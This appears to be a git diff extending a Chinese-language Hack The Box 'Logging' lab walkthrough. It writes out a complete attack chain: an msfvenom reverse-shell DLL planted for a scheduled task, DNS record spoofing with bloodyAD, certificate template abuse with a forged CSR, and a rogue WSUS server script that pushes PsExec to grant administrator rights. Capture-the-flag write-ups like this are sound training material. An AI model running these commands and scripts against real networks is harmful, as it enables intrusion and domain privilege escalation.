@@ -54,7 +54,6 @@
 #### 远程登录`evil-winrm -i 10.129.42.196 -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'`
 ![](./Logging/18.png)
 
-## 提权 ##
 #### 阅读moitor.ps1有计划任务
 ![](./Logging/19.png)
 
@@ -63,9 +62,145 @@
 $service = New-Object -ComObject "Schedule.Service"
 $service.Connect()
 $task = $service.GetFolder("\").GetTask("UpdateChecker Agent")
-$task.Definition | fl *
+$task.Definition
 ```
-关键信息：
+#### 关键信息：Jaylee.clifton每三分钟执行一次C:\Program Files\UpdateMonitor\UpdateMonitor.exe
 ![](./Logging/20.png)
 
 ![](./Logging/21.png)
+
+#### 在C:\ProgramData\UpdateMonitor\Logs中发现log信息，每隔3分钟解压一次Settings_Update.zip，然后加载settings_update.dll
+![](./Logging/22.png)
+
+## 制作木马反弹shell
+`msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKIP LPORT=4447 -a x86 --platform windows -f dll -o settings_update.dll`
+
+`zip Settings_Update.zip settings_update.dll`
+
+![](./Logging/23.png)
+
+#### 稍等片刻就会收到反弹shell
+![](./Logging/24.png)
+
+#### 在用户桌面找到flag
+![](./Logging/25.png)
+
+## 提权
+#### 在C:\Users\jaylee.clifton\Documents\Tickets目录中找到一个html，保存到本地查看
+![](./Logging/26.png)
+
+#### DNS服务器还没更新，wsus.logging.htb是WSUS的服务器，每2分钟运行一个定时任务，那么攻击路径就大致清晰了：伪造DNS➡计划任务执行➡获取恶意文件
+
+#### msa_health$就有更新dns记录的权限
+![](./Logging/27.png)
+
+#### SeMachineAccountPrivilege这个权限可以将计算机添加到域：也就是创建一个新的机器账户。可以在域的 DomainDnsZones 分区中创建 DNS 记录。
+
+#### 添加DNS记录`bloodyAD -d logging.htb -u msa_health$ -p ':603fc24ee01a9409f83c9d1d701485c5' --host DC01.logging.htb --dc-ip 10.129.42.196 add dnsRecord wsus 10.10.17.76`
+
+![](./Logging/28.png)
+
+#### 使用msa_health$进行证书枚举
+`certipy-ad find -u 'msa_health$@logging.htb' -hashes ':603fc24ee01a9409f83c9d1d701485c5' -target DC01.logging.htb -dc-ip 10.129.42.196`
+
+#### IT组的用户可以注册UpdateSrv证书
+![](./Logging/29.png)
+
+#### 通过反弹shell拿到的jaylee.clifton就是IT组的用户
+![](./Logging/30.png)
+
+
+#### csr伪造
+```
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+open('wsus_key.pem', 'wb').write(pk.private_bytes(
+    serialization.Encoding.PEM,
+    serialization.PrivateFormat.TraditionalOpenSSL,
+    serialization.NoEncryption()))
+
+csr = (x509.CertificateSigningRequestBuilder()
+       .subject_name(x509.Name([
+           x509.NameAttribute(NameOID.COMMON_NAME, 'wsus.logging.htb')]))
+       .add_extension(x509.SubjectAlternativeName([
+           x509.DNSName('wsus.logging.htb'), x509.DNSName('wsus')]), critical=False)
+       .sign(pk, hashes.SHA256()))
+open('req.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))
+```
+#### 执行后会生成req.csr，上传到服务器
+![](./Logging/31.png)
+
+
+#### 使用jaylee.clifton的会话申请证书
+`cmd /c "echo N | certreq -f -submit -attrib ""CertificateTemplate:UpdateSrv"" -config ""DC01.logging.htb\logging-DC01-CA"" ""C:\ProgramData\UpdateMonitor\req.csr"" ""C:\ProgramData\UpdateMonitor\cert.cer"" >nul 2>&1"`
+![](./Logging/32.png)
+
+#### 证书保存到本地，使用openssl生成pfx证书
+```
+openssl pkcs12 -export -out wsus_srv.pfx -inkey wsus_key.pem -in cert.cer -passout pass:
+openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_cert.pem -clcerts -nokeys -passin pass:
+openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_key.pem  -nocerts  -nodes  -passin pass:
+openssl x509 -in wsus_srv_cert.pem -noout -subject -ext subjectAltName
+```
+![](./Logging/33.png)
+
+#### 搭建wsus服务器
+
+`wget https://live.sysinternals.com/tools/PsExec64.exe`
+
+```
+import ssl, sys, os, logging, threading
+from functools import partial
+from http.server import HTTPServer
+
+# Stub the ARP / nftables module before wsuks' server imports it
+sys.modules['wsuks.lib.router'] = type(sys)('stub')
+sys.modules['wsuks.lib.router'].Router = object
+
+from wsuks.lib.logger import initLogger
+initLogger(debug=False)
+from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer
+
+HOST = '10.10.17.76'
+EXE  = './PsExec64.exe'
+
+COMMAND = ('/accepteula /s cmd.exe /c "'
+           'net localgroup administrators msa_health$ /add 2>&1 > C:\\Share\\Logs\\PWN.txt & '
+           'net localgroup administrators >> C:\\Share\\Logs\\PWN.txt 2>&1 & '
+           'icacls C:\\Share\\Logs\\PWN.txt /grant Everyone:F"')
+
+exe_bytes = open(EXE, 'rb').read()
+h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
+h.set_resources_xml(COMMAND)
+log = logging.getLogger('wsuks')
+
+def serve(port, use_tls):
+    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
+    if use_tls:
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain('./wsus_srv_cert.pem', './wsus_srv_key.pem')
+        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
+        log.info(f'HTTPS WSUS on {HOST}:{port}')
+    else:
+        log.info(f'HTTP content on {HOST}:{port}')
+    httpd.serve_forever()
+
+threading.Thread(target=serve, args=(8530, False), daemon=True).start()
+serve(8531, True)
+```
+
+#### python运行之后过2分钟就会被请求
+![](./Logging/34.png)
+
+#### 查看执行结果
+![](./Logging/35.png)
+
+#### 重新登录msa_health$，在toby.brynleigh用户桌面找到了flag
+![](./Logging/36.png)
+
+## 参考
+- https://github.com/ZhengJJ05/WriteUp/blob/main/HTB/Season10/Logging/Logging.md
